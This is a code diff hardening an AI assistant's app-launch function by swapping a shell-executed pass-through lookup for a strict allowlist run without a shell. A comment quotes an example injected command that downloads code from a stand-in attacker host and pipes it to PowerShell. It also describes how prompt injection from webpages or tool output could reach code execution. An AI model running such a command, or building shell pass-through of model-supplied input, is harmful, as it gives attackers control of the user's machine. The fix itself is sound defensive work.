@@ -1,35 +1,46 @@
 import subprocess
 import sys
-from typing import List, Optional
+from typing import Dict, List
 
-# A short list of common apps by the name someone would actually say out
-# loud ("open notepad") rather than the exact executable name. Anything not
-# in this list is passed through as a literal command/executable — this is
-# a convenience lookup, not an allowlist (unlike pc-agent's command
-# allowlist, launching an arbitrary named/pathed executable is the intended
-# capability here, gated by the tool's own confirmation/policy tier instead).
-KNOWN_APPS = {
-    "notepad": "notepad.exe",
-    "calculator": "calc.exe",
-    "calc": "calc.exe",
-    "explorer": "explorer.exe",
-    "file explorer": "explorer.exe",
-    "files": "explorer.exe",
-    "paint": "mspaint.exe",
-    "task manager": "taskmgr.exe",
-    "control panel": "control.exe",
-    "cmd": "cmd.exe",
-    "command prompt": "cmd.exe",
-    "terminal": "wt.exe",
-    "powershell": "powershell.exe",
-    "settings": "start ms-settings:",
-    "chrome": "chrome.exe",
-    "edge": "msedge.exe",
-    "word": "winword.exe",
-    "excel": "excel.exe",
-    "vscode": "code.exe",
-    "visual studio code": "code.exe",
-    "spotify": "spotify.exe",
+# A strict allowlist: spoken app name -> the exact argv to run. Nothing
+# else is launchable.
+#
+# This was previously a *convenience lookup* whose misses fell through to
+# `subprocess.Popen(name, shell=True)`, which meant a model-supplied
+# target like `notepad & curl evil.com/x | powershell -` ran as a shell
+# command line. Since tool targets originate from a model that reads
+# webpages, screenshots and tool output, that was a direct path from a
+# prompt injection to arbitrary code execution on this machine.
+#
+# Two rules keep it closed, and both matter:
+#   1. An unknown name is refused outright — never passed through.
+#   2. argv is a fixed list and `shell` is never enabled, so shell
+#      metacharacters in any string are inert data, not syntax.
+#
+# "cmd"/"powershell"/"terminal" are deliberately absent: handing a voice
+# command a shell prompt would reintroduce the same hole one step removed
+# (see the repo rule in AGENTS.md against raw-shell execution paths).
+LAUNCHABLE_APPS: Dict[str, List[str]] = {
+    "notepad": ["notepad.exe"],
+    "calculator": ["calc.exe"],
+    "calc": ["calc.exe"],
+    "explorer": ["explorer.exe"],
+    "file explorer": ["explorer.exe"],
+    "files": ["explorer.exe"],
+    "paint": ["mspaint.exe"],
+    "task manager": ["taskmgr.exe"],
+    "control panel": ["control.exe"],
+    # `start ms-settings:` was the one entry that genuinely required a
+    # shell (`start` is a cmd builtin). explorer.exe opens the same URI as
+    # a real executable taking an argument, so the shell isn't needed.
+    "settings": ["explorer.exe", "ms-settings:"],
+    "chrome": ["chrome.exe"],
+    "edge": ["msedge.exe"],
+    "word": ["winword.exe"],
+    "excel": ["excel.exe"],
+    "vscode": ["code.exe"],
+    "visual studio code": ["code.exe"],
+    "spotify": ["spotify.exe"],
 }
 
 
@@ -61,12 +72,25 @@ def _desktop():
 
 def launch_app(name: str) -> str:
     key = name.strip().lower()
-    command = KNOWN_APPS.get(key, name.strip())
-    if not command:
+    if not key:
         raise OSAutomationError("No application name given")
+
+    argv = LAUNCHABLE_APPS.get(key)
+    if argv is None:
+        # Refused, not attempted. Listing what *is* allowed keeps this
+        # honest ("say what's unavailable") without hinting that some
+        # other spelling might smuggle the request through.
+        allowed = ", ".join(sorted(set(LAUNCHABLE_APPS)))
+        raise OSAutomationError(f'"{name}" is not an app JARVIS can launch. Allowed: {allowed}')
+
     try:
-        subprocess.Popen(command, shell=True)
-    except Exception as exc:
+        # shell=False (the default) is the security boundary here — argv
+        # is passed to CreateProcess as a fixed list, so no element is
+        # ever parsed as shell syntax.
+        subprocess.Popen(argv, shell=False)
+    except FileNotFoundError as exc:
+        raise OSAutomationError(f'"{name}" is allowed but not installed or not on PATH') from exc
+    except OSError as exc:
         raise OSAutomationError(f'Could not launch "{name}": {exc}') from exc
     return f"Launched {name}."
 
